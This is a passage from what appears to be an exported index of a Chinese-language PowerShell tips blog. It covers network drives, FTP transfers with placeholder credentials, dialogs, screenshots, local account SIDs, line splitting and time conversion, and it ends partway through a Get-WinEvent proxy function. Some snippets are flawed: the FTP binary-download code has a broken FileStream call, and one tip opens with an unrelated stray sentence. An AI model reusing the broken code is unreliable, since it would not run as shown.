额外提示：您也可以使用 Get-Printer 查找远程打印机名称。Get-Printer 还接受 -CimSession 参数，因此您可以使用相同的网络会话从一台或多台远程服务器查询所有打印机名称。","link":"/2021/08/09/reading-printer-properties-part-3/"},{"title":"PowerShell 技能连载 - 列出网络驱动器","text":"有很多方法可以列出映射的网络驱动器。其中之一使用 PowerShell 的 Get-PSDrive 并检查目标根目录是否以 “\\“ 开头，表示 UNC 网络路径： 12345PS&gt; Get-PSDrive -PSProvider FileSystem | Where-Object DisplayRoot -like '\\\\*'Name Used (GB) Free (GB) Provider Root CurrentLocation---- --------- --------- -------- ---- ---------------Z 11076,55 0,00 FileSystem \\\\192.168.2.107\\docs 一个不错的方面是 Get-PSDrive 返回有用的附加详细信息，例如驱动器的大小。","link":"/2021/08/11/listing-network-drives-2/"},{"title":"PowerShell 技能连载 - 移除网络驱动器","text":"虽然 Remove-PSDrive 可以删除包括网络驱动器在内的所有类型的驱动器，但更改可能要等系统重新启动时才能生效。这当然是荒谬的。 这个任务是一个很好的例子，为什么 PowerShell 使控制台应用程序成为平等公民是有用的。事实上，即使在 2021 年，移除网络驱动器的最可靠方法也是使用旧的但经过验证的 net.exe。下面的示例删除网络驱动器号 Z： 12PS&gt; net use z: /deletez: was deleted successfully.","link":"/2021/08/13/removing-network-drives/"},{"title":"PowerShell 技能连载 - 处理控制台命令的错误","text":"有时，在 PowerShell 脚本中使用控制台应用程序很有用，甚至是必要的。例如，在上一个技能中，我们研究了删除映射网络驱动器的方法，尽管 Remove-PSDrive 声称能够执行此操作，但最可靠的方法仍然是使用旧的 net.exe 控制台命令。 让我们快速看看如何检查控制台命令是否成功完成。 让我们尝试通过映射一个新的网络驱动器，然后使用控制台应用程序将其删除。当然，您可以将相同的原则应用于您可能需要在 PowerShell 脚本中运行的任何控制台应用程序： 12345678910111213141516PS&gt; net use z: \\\\127.0.0.1\\c$The command completed successfully.PS&gt; net use z: /deletez: was deleted successfully.PS&gt; net use z: /deletenet : The network connection could not be found.At line:1 char:1+ net use z: /delete+ ~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (The network con...d not be found.:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandErrorMore help is available by typing NET HELPMSG 2250. 创建好映射驱动器，然后再删除。但是，状态消息是本地化的（因此很难将它们与多国环境中的预期值进行比较），并且错误会作为异常出现。 通过使用 $?，您可以将输出转换为仅 $true 或 $false：$true 表示命令成功完成，而 $false 表示（任何）错误： 12345678910111213PS&gt; $null = net use z: \\\\127.0.0.1\\c$; $result = $?; $resultTruePS&gt; $null = net use z: \\\\127.0.0.1\\c$; $result = $?; $resultnet : System error 85 has occurred.At line:1 char:9+ $null = net use z: \\\\127.0.0.1\\c$; $result = $?; $result+ ~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (System error 85 has occurred.:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandErrorThe local device name is already in use.False 这要好得多，因为您的脚本随后可以判断 $result 并在出现错误时采取适当的步骤或将消息写入日志文件。 但是，如果出现错误，详细的错误信息仍会发送到控制台，并且没有（明显的）方法可以将其删除。即使是成熟的 try...catch 错误处理程序也不会响应它们： 12345678910PS&gt; $null = try { net use z: \\\\127.0.0.1\\c$} catch {}; $result = $?; $resultnet : System error 85 has occurred.At line:1 char:15+ $null = try { net use z: \\\\127.0.0.1\\c$} catch {}; $result = $?; $res ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (System error 85 has occurred.:String) [], RemoteException + FullyQualifiedErrorId : NativeCommandErrorThe local device name is already in use.False 原因是：控制台应用程序不会抛出 .NET 异常。发生错误时，控制台应用程序仅通过输出流 #2 发出信息。 而这恰好是包装控制台应用程序的解决方案：将所有流重定向到输出流。这段代码映射了一个网络驱动器：第一次调用成功所有后续调用都失败： 12345678PS&gt; $null = net use z: \\\\127.0.0.1\\c$ *&gt;&amp;1; $?TruePS&gt; $null = net use z: \\\\127.0.0.1\\c$ *&gt;&amp;1; $?FalsePS&gt; $null = net use z: \\\\127.0.0.1\\c$ *&gt;&amp;1; $?False 同样，这会再次删除映射的驱动器，就像在第一次调用成功之前一样，所有剩余的调用都会失败： 12345678PS&gt; $null = net use z: /delete *&gt;&amp;1; $result = $?; $resultTruePS&gt; $null = net use z: /delete *&gt;&amp;1; $result = $?; $resultFalsePS&gt; $null = net use z: /delete *&gt;&amp;1; $result = $?; $resultFalse","link":"/2021/08/17/error-handling-for-console-commands/"},{"title":"PowerShell 技能连载 - 显示警告对话框（第 1 部分）","text":"这是一个显示弹出警告对话框的快速代码示例： 12345Add-Type -AssemblyName System.Windows.Forms$message = 'Your system will shutdown soon!'$title = 'Alert'[System.Windows.Forms.MessageBox]::Show($message, $title, [System.Windows.Forms.MessageBoxButtons]::OKCancel, [System.Windows.Forms.MessageBoxIcon]::Warning) 这些是可用的按钮样式： 1234567PS&gt; [Enum]::GetNames([System.Windows.Forms.MessageBoxButtons])OKOKCancelAbortRetryIgnoreYesNoCancelYesNoRetryCancel 这些是可用的图标样式： 12345678910PS&gt; [Enum]::GetNames([System.Windows.Forms.MessageBoxIcon])NoneHandErrorStopQuestionExclamationWarningAsteriskInformation","link":"/2021/08/19/displaying-warning-dialog-part-1/"},{"title":"PowerShell 技能连载 - 显示警告对话框（第 2 部分）","text":"在之前的技能中，我们创建了新的快捷方式文件，您已经看到 CreateShortcut() 方法如何提供方法来控制快捷方式的几乎所有细节。这是在桌面上创建 PowerShell 快捷方式的代码： 这个技能可以帮助您始终在其他窗口的顶部显示对话框。为此，下面的代码创建了一个新的虚拟窗口，并确保该窗口位于所有其他窗口的顶部。然后，此窗口用作弹出对话框的父级： 12345678910111213Add-Type -AssemblyName System.Windows.Forms$message = 'Your system will shutdown soon!'$title = 'Alert'# create a dummy window$form = [System.Windows.Forms.Form]::new()$form.TopMost = $true# use the dummy window as parent for the dialog so it appears on top of it[System.Windows.Forms.MessageBox]::Show($form, $message, $title, [System.Windows.Forms.MessageBoxButtons]::OKCancel, [System.Windows.Forms.MessageBoxIcon]::Warning)# don't forget to dispose the dummy window after use$form.Dispose()","link":"/2021/08/23/displaying-warning-dialog-part-2/"},{"title":"PowerShell 技能连载 - 发现公共 IP 地址","text":"使用 Web 服务，确定您的公共 IP 地址和有关您的 ISP 的信息几乎是举手之劳： 12345678910111213PS&gt; Invoke-RestMethod -Uri https://ipinfo.ioip : 84.165.49.158hostname : p54a5319e.dip0.t-ipconnect.decity : Hannoverregion : Lower Saxonycountry : DEloc : 52.3705,9.7332org : AS3320 Deutsche Telekom AGpostal : 30159timezone : Europe/Berlinreadme : https://ipinfo.io/missingauth","link":"/2021/08/25/discovering-public-ip-address/"},{"title":"PowerShell 技能连载 - 使用 FTP：列出文件夹（第 1 部分）","text":"PowerShell 不附带用于通过 FTP 下载和上传数据的 cmdlet。但是，您可以使用 .NET 来实现。 要显示 FTP 文件夹的内容，请尝试使用以下代码： 123456789101112131415$username='testuser'$password='P@ssw0rd'$ftp='ftp://192.168.1.123'$subfolder='/'[System.Uri]$uri = $ftp + $subfolder$ftprequest=[System.Net.FtpWebRequest]::Create($uri)$ftprequest.Credentials= [System.Net.NetworkCredential]::new($username,$password)$ftprequest.Method=[System.Net.WebRequestMethods+Ftp]::ListDirectory$response=$ftprequest.GetResponse()$stream=$response.GetResponseStream()$reader=[System.IO.StreamReader]::new($stream,[System.Text.Encoding]::UTF8)$content=$reader.ReadToEnd()$content","link":"/2021/08/27/using-ftp-listing-folders-part-1/"},{"title":"PowerShell 技能连载 - 使用 FTP：下载文件（第 2 部分）","text":"PowerShell 不附带用于通过 FTP 下载和上传数据的 cmdlet。但是，您可以为此使用 .NET。 要从 FTP 服务器下载文件，请尝试使用以下代码： 123456789$localFile = &quot;C:\\test.txt&quot;$username='testuser'$password='P@ssw0rd'[System.Uri]$uri = &quot;ftp://${username}:$password@192.168.1.123/test.txt&quot;$webclient = [System.Net.WebClient]::new()$webclient.DownloadFile($uri, $localFile)$webclient.Dispose()","link":"/2021/08/31/using-ftp-downloading-file-part-2/"},{"title":"PowerShell 技能连载 - 使用 FTP：下载二进制文件（第 3 部分）","text":"PowerShell 不附带用于通过 FTP 下载和上传数据的 cmdlet。但是，您可以使用 .NET 来实现。 要以二进制模式从 FTP 服务器下载文件，请尝试以下代码，该代码还说明了如何使用显式凭据进行身份验证： 12345678910111213141516171819202122232425262728293031$username='testuser'$password='P@ssw0rd'[System.Uri]$uri='ftp://192.168.1.123/test.txt'$localFile = 'C:\\test.txt'$ftprequest=[System.Net.FtpWebRequest]::Create($uri)$ftprequest.Credentials=[System.Net.NetworkCredential]::new($username,$password)$ftprequest.Method=[System.Net.WebRequestMethods+Ftp]::DownloadFile$ftprequest.UseBinary = $true$ftprequest.KeepAlive = $false$response=$ftprequest.GetResponse()$stream=$response.GetResponseStream()try{ $targetfile = [System.IO.FileStream]::($localFile,[IO.FileMode]::Create) [byte[]]$readbuffer = New-Object byte[] 1024 do{ $readlength = $stream.Read($readbuffer,0,1024) $targetfile.Write($readbuffer,0,$readlength) } while ($readlength -gt 0) $targetfile.Close()}catch{ Write-Warning &quot;Error occurred: $_&quot;}","link":"/2021/09/02/using-ftp-downloading-binary-file-part-3/"},{"title":"PowerShell 技能连载 - 使用 FTP：上传文件（第 4 部分）","text":"PowerShell 不附带用于通过 FTP 下载和上传数据的 cmdlet。但是，您可以使用 .NET 来实现。 要将文件从本地驱动器上传到 FTP 服务器，请尝试以下代码： 123456789$localFile = &quot;C:\\test.txt&quot;$username='testuser'$password='P@ssw0rd'[System.Uri]$uri = &quot;ftp://${username}:$password@192.168.1.123/test.txt&quot;$webclient = [System.Net.WebClient]::new()$webclient.UploadFile($uri, $localFile)$webclient.Dispose()","link":"/2021/09/06/using-ftp-uploading-file-part-4/"},{"title":"PowerShell 技能连载 - 从网站读取 HTTP 消息头","text":"当您导航到一个网页时，您的浏览器会静默地接收 HTTP 标头中的元信息，而这些元信息通常是不可见的。 要显示任何网站的 HTTP 消息头，请尝试以下操作： 123# replace URL with any web page you like:$url = 'www.tagesschau.de'(Invoke-WebRequest -Method Head -Uri $url -UseBasicParsing).RawContent 诀窍是使用 -Method 参数并提交 Head 值来获取消息头而不是网页内容。 结果类似于： HTTP/1.1 200 OK Connection: keep-alive Access-Control-Allow-Origin: * Cache-Control: max-age=14 Content-Type: text/html; charset=utf-8 Date: Tue, 10 Aug 2021 12:06:37 GMT The header info returned by a web page can vary greatly. When you replace the URL in above example with ‘www.google.de’, for example, you see many more instructions being sent to your browser, and you can actually “see” how the web page instructs your browser to set new cookies – so you can check whether the web page sets cookies before asking for consent or not:网页返回的标题信息可能会有很大差异。例如，当您将上面示例中的 URL 替换为 “www.google.de&quot; 时，您会看到更多的指令被发送到您的浏览器，您实际上可以“看到”网页如何指示您的浏览器设置新的 cookie——因此您可以在征求同意之前检查网页是否设置了 cookie： HTTP/1.1 200 OK X-XSS-Protection: 0 X-Frame-Options: SAMEORIGIN Transfer-Encoding: chunked Cache-Control: private Content-Type: text/html; charset=UTF-8 Date: Tue, 10 Aug 2021 12:07:06 GMT Expires: Tue, 10 Aug 2021 12:07:06 GMT P3P: CP=&quot;This is not a P3P policy! See g.co/p3phelp for more info.&quot; Set-Cookie: NID=221=C8RdXG_2bB_MwOG33_lS0hx3P5TF5_vaamoT0xj3yKgZPzCjr_g70NvJXkhenV_GMt1TYYU6XwmNOtlkRKRADiXgYJWWYp671M3DFL8DCxM_J1Cl01r39-jfA7sIxu1C -0B7CHI-8WfXj5IGZ5dHtRxndNA84cpQov5phLhi7l8; expires=Wed, 09-Feb-2022 12:07:06 GMT; path=/; domain=.google.de; HttpOnly Server: gws 如果您愿意，您也可以以表格形式获取消息头 —— 只需将 RawContent 替换为 Headers： 123# replace URL with any web page you like:$url = 'www.google.de'(Invoke-WebRequest -Method Head -Uri $url -UseBasicParsing).Headers","link":"/2021/09/08/reading-http-headers-from-websites/"},{"title":"PowerShell 技能连载 - Creating Dummy Test Files","text":"If you need to test file system load, test failover clusters, or need large dummy files otherwise, rather than creating new files and slowly filling them with random data, try this: $filepath = &quot;$env:temp\\testfile.txt&quot; $sizeBytes = 5.75MB $file = [System.IO.File]::Create($filepath) $file.SetLength($sizeBytes) $file.Close() $file.Dispose() # show dummy file in Windows Explorer explorer /select,$filepath This code creates dummy files of any size in a snap and can be used to quickly create storage load. Just don’t forget to delete these files after use.","link":"/2021/09/10/creating-dummy-test-files/"},{"title":"PowerShell 技能连载 - 简单的内置密码生成器","text":".NET System.Web 程序集中有一个隐藏的功能，它可以让您立即创建任意长度的随机密码： 12345678910# total password length$Length = 10# number of non-alpha-chars$NonChar = 3Add-Type -AssemblyName 'System.Web'$password = [System.Web.Security.Membership]::GeneratePassword($Length,$NonChar)&quot;Your password: $password&quot;","link":"/2021/09/14/simple-built-in-password-generator/"},{"title":"PowerShell 技能连载 - 识别连上的 Domain","text":"确定您连上的域名称的一种快速方法是 WMI： 1234PS&gt; Get-CimInstance -ClassName Win32_NTDomainDomainName DnsForestName DomainControllerName---------- ------------- -------------------- 如果您未连接到域，则结果是一个空对象。","link":"/2021/09/16/identifying-connected-domain/"},{"title":"PowerShell 技能连载 - 识别本地管理员帐户","text":"Windows 计算机上有一些默认帐户，例如本地 “Administrator” 帐户。虽然默认情况下此帐户存在，但其名称可以因文化而异，并且其名称也可以重命名。 要始终识别本地管理员帐户而不管其名称如何，请按 SID（安全标识符）搜索本地帐户。本地管理员帐户 SID 始终以 “S-1-5-“ 开头并使用 RID “-500”： 12345PS&gt; Get-Localuser | Where-Object Sid -like 'S-1-5-*-500'Name Enabled Description---- ------- -----------Administrator False Built-in account for administering the computer/domain","link":"/2021/09/20/identifying-local-administrator-account/"},{"title":"PowerShell 技能连载 - 识别本地管理员组","text":"内置管理员组的任何成员都可以访问广泛的权限，因此检查该组的成员可以成为安全审核的一部分。虽然 “Administrators” 组默认存在，但其名称可能因文化而异，因为它是本地化的。例如，在德国系统中，该组称为 “Administratoren”。 要访问用户组，而无论文化和命名如何变化，请使用其 SID，它始终为 “S-1-5-32-544”： 12345PS&gt; Get-LocalGroup -SID S-1-5-32-544Name Description---- -----------Administrators Administrators have complete and unrestricted access to the... 同样，要转储具有管理员权限的用户和组列表，请使用 SID 而不是组名： 1PS&gt; Get-LocalGroupMember -SID S-1-5-32-544","link":"/2021/09/22/identifying-local-administrators-group/"},{"title":"PowerShell 技能连载 - 重命名本地管理员账户","text":"出于安全原因，您可能需要考虑重命名内置的本地管理员帐户。这个账户权限很大，它的名字很容易猜到，所以它是攻击者的常用载体。在重命名此帐户之前，请确保您了解后果： 该账户仍能继续工作，但您现在需要使用新分配的名称来登录该帐户。确保没有使用旧的默认名称的自动登录过程 重命名帐户不会更改其 SID，因此老练的攻击者仍然可以使用其众所周知的 SID 锁定此帐户 要重命名内置 Administrator 帐户（或任何其他本地帐户），请以管理员权限启动 PowerShell，然后运行以下代码： 1PS&gt; Rename-LocalUser -Name &quot;Administrator&quot; -NewName &quot;TobiasA&quot; 要使用该帐户登录，请使用新分配的名称。通过使用账户的众所周知的 SID，即使您不知道其名称，您仍然可以识别重命名的帐户： 12345PS&gt; Get-Localuser | Where-Object Sid -like 'S-1-5-*-500'Name Enabled Description---- ------- -----------TobiasA False Built-in account for administering the computer/domain","link":"/2021/09/24/renaming-local-administrator-account/"},{"title":"PowerShell 技能连载 - 禁用本地的 Guest 账户","text":"Windows 自带一个名为 “Guest” 的内置帐户。由于此帐户很少使用，最好将它禁用。否则，它的广为人知的名字可能会成为攻击者的目标。 由于帐户名称是本地化的并且可能因文化而略有不同，因此要识别帐户，请使用其 SID： 12345PS&gt; Get-Localuser | Where-Object Sid -like 'S-1-5-*-501'Name Enabled Description---- ------- -----------Guest False Built-in account for guest access to the computer/domain 如果该帐户尚未禁用（请查看 ““Enabled”“ 属性），请使用提升权限的 PowerShell 和 Disable-LocalUser cmdlet 禁用该帐户。","link":"/2021/09/28/disabling-local-guest-account/"},{"title":"PowerShell 技能连载 - 截屏","text":"借助 System.Windows.Forms 中的类型，PowerShell 可以轻松捕获屏幕并将屏幕截图保存到文件中。下面的代码捕获整个虚拟屏幕，将屏幕截图保存到文件中，然后在相关程序中打开位图文件（如果有）： 1234567891011121314$Path = &quot;$Env:temp\\screenshot.bmp&quot;Add-Type -AssemblyName System.Windows.Forms$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen$width = $screen.Width$height = $screen.Height$left = $screen.Left$top = $screen.Top$bitmap = [System.Drawing.Bitmap]::new($width, $height)$MyDrawing = [System.Drawing.Graphics]::FromImage($bitmap)$MyDrawing.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)$bitmap.Save($Path)Start-Process -FilePath $Path","link":"/2021/09/30/taking-screenshot/"},{"title":"PowerShell 技能连载 - 分割文本行（第 1 部分）","text":"有时，您需要逐行处理多行文本。下面是一个多行字符串的示例： 1234567891011# working with 1-dimensional input# $data is a single string$data = @'Server1Server2Cluster4'@$data.GetType().FullName$data.Count 将文本拆分为单独的行的一种有效方法是使用带有正则表达式的 -split 运算符，该表达式可以处理各种依赖于平台的行终止符： 12345678910# split the string in individual lines# $array is an array with individual lines now$regex = '[\\r\\n]{1,}'$array = $data -split $regex$array.GetType().FullName$array.Count$array 以下是您在脚本中遇到的 $regex 中的正则表达式的一些替代方案： 分隔用的正则表达式 说明 /r 类似于“回车”(ASCII 13)。如果操作系统不是用该字符作为换行符，则分割将会失败。如果操作系统使用该字符加上“换行”(ASCII 10)，那么多出来的不可见的换行符会破坏字符串。 /n 类似上面的情况，只是相反。 [\\r\\n]+ 与上面的示例代码相同。如果有一个或多个字符，PowerShell 会在两个字符处拆分。这样，CR、LF 或 CRLF、LFCR 在拆分时都被删除。但是，多个连续的新行也将全部删除：CRCRCR 或 CRLFCRLF。 (\\r\\n \\r 如果您从文本文件中读取文本，Get-Content 会自动将文本拆分为行。要将整个文本内容作为单个字符串读取，则需要添加 -Raw 参数。","link":"/2021/10/04/turning-text-into-individual-lines-part-1/"},{"title":"PowerShell 技能连载 - 分割文本行（第 2 部分）","text":"假设您的脚本获取文本输入数据，并且您需要将文本拆分为单独的行。在上一个技能中，我们建议了一些正则表达式来完成这项工作。但是如果输入文本包含空行怎么办？ 1234567891011121314# $data is a single string and contains blank lines$data = @'Server1Server2Cluster4'@# split in single lines and remove empty lines$regex = '[\\r\\n]{1,}' 如您所见，我们使用的正则表达式会自动处理文本中间的空白行，但文本开头或结尾的空白行会保留。 00 01 Server1 02 Server2 03 Cluster4 04 那是因为我们在任意数量的新行处分割，所以我们也在文本的开头和结尾处分割。我们实际上是自己生成了这两个剩余的空白行。 为了避免这些空行，我们必须确保文本的开头和结尾没有换行符。这就是 Trim() 可以做的事情： 1234567891011121314151617181920212223242526272829303132# $data is a single string and contains blank lines$data = @'Server1Server2Cluster4'@$data = $data.Trim()# split in single lines and remove empty lines$regex = '[\\r\\n]{1,}'$array = $data -split $regex$array.Count$c = 0Foreach ($_ in $array){ '{0:d2} {1}' -f $c, $_ $c++}00 Server101 Server202 Cluster4","link":"/2021/10/06/turning-text-into-individual-lines-part-2/"},{"title":"PowerShell 技能连载 - 分割文本行（第 3 部分）","text":"在上一个技能中，我们将一大块多行文本拆分为单独的行，并删除了所有空行。 然而，当一行不是真正的空，而是包含空格（空格或制表符）时，它仍然会被输出： 1234567891011121314151617181920212223242526# $data is a single string and contains blank lines$data = @'Server1Server2Cluster4'@$data = $data.Trim()# split in single lines and remove empty lines$regex = '[\\r\\n]{1,}'$array = $data -split $regex$array.Count$c = 0Foreach ($_ in $array){ '{0:d2} {1}' -f $c, $_ $c++} 在这里，我们在 “Server2” 正上方的行中添加了几个空格（当然，在列表中看不到）。以下是执行结果： 00 Server1 01 02 Server2 03 Cluster4 由于我们要在任意数量的 CR 和 LF 字符处拆分，因此空格会破坏该模式。 与其将正则表达式变成一个更复杂的野兽，不如为这些事情附加一个简单的 Where-Object 来进行精细修饰： 123456789101112131415161718192021222324252627# $data is a single string and contains blank lines$data = @'Server1Server2Cluster4'@$data = $data.Trim()# split in single lines and remove empty lines$regex = '[\\r\\n]{1,}'$array = $data -split $regex | Where-Object { [string]::IsNullOrWhiteSpace($_) -eq $false }$array.Count$c = 0Foreach ($_ in $array){ '{0:d2} {1}' -f $c, $_ $c++} [string]::IsNullOrEmpty() 代表我们所追求的情况，因此符合条件的行被 Where-Object 删除。结果就是所需要的理想结果： 00 Server1 01 Server2 02 Cluster4","link":"/2021/10/08/turning-text-into-individual-lines-part-3/"},{"title":"PowerShell 技能连载 - 创建动态参数","text":"动态参数是一种特殊的参数，可以根据运行时条件显示或隐藏。 您的 PowerShell 函数可以例如具有一个参数，并基于用户选择的操作，将显示其他参数。或者，只有在用户具有管理员权限时才能显示参数。 不幸的是，组合动态参数并不是一件轻松的事。借助称为 “dynpar” 的模块，使用动态参数变得同样简单，就像使用“普通”静态参数一样简单，然后您可以简单地使用名为 [Dynamic()] 的新属性指定动态参数，该属性告诉 PowerShell 需要满足以哪些条件以显示参数： 12345678910111213141516171819param( # regular static parameter [string] $Normal, # show -Lunch only at 11 a.m. or later [Dynamic({(Get-Date).Hour -ge 11})] [switch] $Lunch, # show -Mount only when -Path refers to a local path (and not a UNC path) [string] $Path, [Dynamic({$PSBoundParameters['Path'] -match '^[a-z]:'})] [switch] $Mount) 您可以在此处找到一份详细的操作指南：https://github.com/tobiaspsp/modules.dynpar","link":"/2021/10/12/creating-dynamic-parameters/"},{"title":"PowerShell 技能连载 - 将 UNIX 时间转为 DateTime","text":"“UNIX时间”计算自 01/01/1970 以来经过的秒数。 例如，在 Windows 中，您可以从 Windows 注册表中读取安装日期，返回的值为 “Unix时间”： 1234$values = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'$installDateUnix = $values.InstallDate$installDateUnix 结果是类似这样的大数字： 1601308412 To convert “Unix time” to a real DateTime value, .NET Framework provides a type called [DateTimeOffset]:要将“UNIX时间”转换为真实的 DateTime 值，请使用 .NET Framework 提供的 [DateTimeOffset] 类： 1234$values = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'$installDateUnix = $values.InstallDate[DateTimeOffset]::FromUnixTimeSeconds($installDateUnix) 现在您能得到不同的日期和时间表示： DateTime : 28.09.2020 15:53:32 UtcDateTime : 28.09.2020 15:53:32 LocalDateTime : 28.09.2020 17:53:32 Date : 28.09.2020 00:00:00 Day : 28 DayOfWeek : Monday DayOfYear : 272 Hour : 15 Millisecond : 0 Minute : 53 Month : 9 Offset : 00:00:00 Second : 32 Ticks : 637369052120000000 UtcTicks : 637369052120000000 TimeOfDay : 15:53:32 Year : 2020 要获取本地格式的安装时间，您可以在一行代码中写完它： 123PS&gt; [DateTimeOffset]::FromUnixTimeSeconds((Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion').InstallDate).DateTimeModay, September 28, 2020 15:53:32","link":"/2021/10/14/converting-unix-time-to-datetime/"},{"title":"PowerShell 技能连载 - 将 Ticks 转换为 DateTime","text":"偶尔，日期和时间信息以所谓的“缺陷”的格式存储为 “Ticks”。 Ticks 是自 01/01/1601 以来，100 纳秒的单位数。Active Directory 在内部使用此格式，但您也可以在其他地方找到它。 以下是以 “Ticks” 为单位的 Windows 安装时间的示例： 1234$values = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'$installDateTicks = $values.InstallTime$installDateTicks 结果是（非常）大的 64 比特数字： 132457820129777032 要将 Ticks 转换为 DateTime，请使用 [DateTimeOffset]： 12345$values = Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'$installDateTicks = $values.InstallTime$installDate = [DateTimeOffset]::FromFileTime($installDateTicks)$installDate.DateTime","link":"/2021/10/18/converting-ticks-to-datetime/"},{"title":"PowerShell 技能连载 - 调整脚本性能","text":"如果脚本运行速度速度慢，找出导致延迟的地方并优化并不是一件很简单的事。使用名为 “psprofiler” 的 PowerShell 模块，可以测试脚本中的每行所需的时间。它在 Windows PowerShell 和 PowerShell 7 中都能运行。 首先安装模块： 1PS&gt; Install-Module -Name PSProfiler -Scope CurrentUser 下一步，用 Measure-Script 执行脚本： 1PS&gt; Measure-Script -Path 'C:\\Users\\tobias\\test123.ps1' Once your script completes, you get a sophisticated report telling you exactly how often each line of your script was executed, and how long it took:脚本完成后，就会获得一份复杂的报告，告诉您脚本每行执行的次数，以及消耗的时间： Count Line Time Taken Statement ----- ---- ---------- --------- 1 1 00:00.0033734 $Path = &quot;$env:temp\\tv.json&quot; 0 2 00:00.0000000 1 3 00:28.1602885 $data = Get-Content -Path $Path -Raw | 0 4 00:00.0000000 ConvertFrom-Json | 1 5 00:26.6558438 ForEach-Object { $_ } | 0 6 00:00.0000000 ForEach-Object { 0 7 00:00.0000000 101000 8 00:01.4408993 $title = '{0,5} [{2}] &quot;{1}&quot; ({3})' -f ([Object[]]$_) 101000 9 00:13.6815132 $title | Add-Member -MemberType NoteProperty -Name Data -Value $_ -PassThru 0 10 00:00.0000000 } 0 11 00:00.0000000 ...","link":"/2021/10/20/tuning-script-performance/"},{"title":"PowerShell 技能连载 - Working with Get-WinEvent","text":"如果您想从 Windows 事件日志中读取系统事件，Get-Eventlog 是个易于使用且简单的选择。这段代码能够获取最新的 10 个错误和警告事件： 1PS&gt; Get-EventLog -LogName System -EntryType Error,Warning -Newest 10 不幸的是，Get-Eventlog 已被弃用，并且它不再可用于 PowerShell 7。弃用有很明显的原因：该 cmdlet 只能从“经典”日志文件中读取，它很缓慢并且具有其他限制。 这就是为什么 PowerShell 在3.0版中推出更好的替代命令：Get-WinEvent。PowerShell 7 也有此 cmdlet。 Unfortunately, Get-WinEvent is much harder to use because there are no intuitive parameters, and instead your filter criteria needs to be specified as a hash table.不幸的是，Get-Winevent 更难使用，因为没有直观的参数，而是需要通过哈希表指定过滤条件。 但是，通过“代理函数”，您可以指导 Get-WinEvent 使用您所熟悉的旧式参数。以下是代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210&lt;#Suggestion to improve Get-WinEvent in order to make it compatible to the commonly used Get-EventLog callsBelow is a prototype using a proxy function. Run it to enhance Get-WinEvent.To get rid of the enhancement, either restart PowerShell or run:Remove-Item -Path function:Get-WinEventNote that the prototype emits the composed hash table to the console (green)\\#&gt;function Get-WinEvent{ [CmdletBinding(DefaultParameterSetName='GetLogSet', HelpUri='https://go.microsoft.com/fwlink/?LinkID=138336')] param( [Parameter(ParameterSetName='ListLogSet', Mandatory=$true, Position=0)] [AllowEmptyCollection()] [string[]] ${ListLog}, [Parameter(ParameterSetName='LogNameGetEventlog', Mandatory=$true, Position=0)] &lt;#NEW\\#&gt; [Parameter(ParameterSetName='GetLogSet', Position=0, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)] [string[]] ${LogName}, [Parameter(ParameterSetName='ListProviderSet', Mandatory=$true, Position=0)] [AllowEmptyCollection()] [string[]] ${ListProvider}, &lt;# Get-EventLog supports wildcards, Get-WinEvent does not. Needs to be corrected. #&gt; [Parameter(ParameterSetName='GetProviderSet', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)] [string[]] ${ProviderName}, [Parameter(ParameterSetName='FileSet', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)] [Alias('PSPath')] [string[]] ${Path}, [Parameter(ParameterSetName='FileSet')] [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='GetLogSet')] [Parameter(ParameterSetName='HashQuerySet')] [Parameter(ParameterSetName='XmlQuerySet')] [ValidateRange(1, 9223372036854775807)] [long] ${MaxEvents}, &lt;# NEW \\#&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [ValidateRange(0, 2147483647)] [int] ${Newest}, [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='ListProviderSet')] [Parameter(ParameterSetName='ListLogSet')] [Parameter(ParameterSetName='GetLogSet')] [Parameter(ParameterSetName='HashQuerySet')] [Parameter(ParameterSetName='XmlQuerySet')] [Parameter(ParameterSetName='LogNameGetEventlog')] &lt;#NEW\\#&gt; [Alias('Cn')] [ValidateNotNullOrEmpty()] &lt;#CORRECTED\\#&gt; [string] &lt;# used to be [String[]], Get-WinEvent accepts [string] only, should be changed to accept string arrays \\#&gt; ${ComputerName}, [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='ListProviderSet')] [Parameter(ParameterSetName='ListLogSet')] [Parameter(ParameterSetName='GetLogSet')] [Parameter(ParameterSetName='HashQuerySet')] [Parameter(ParameterSetName='XmlQuerySet')] [Parameter(ParameterSetName='FileSet')] [pscredential] [System.Management.Automation.CredentialAttribute()] ${Credential}, [Parameter(ParameterSetName='FileSet')] [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='GetLogSet')] [ValidateNotNull()] [string] ${FilterXPath}, [Parameter(ParameterSetName='XmlQuerySet', Mandatory=$true, Position=0)] [xml] ${FilterXml}, [Parameter(ParameterSetName='HashQuerySet', Mandatory=$true, Position=0)] [hashtable[]] ${FilterHashtable}, [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='ListLogSet')] [Parameter(ParameterSetName='GetLogSet')] [Parameter(ParameterSetName='HashQuerySet')] [switch] ${Force}, 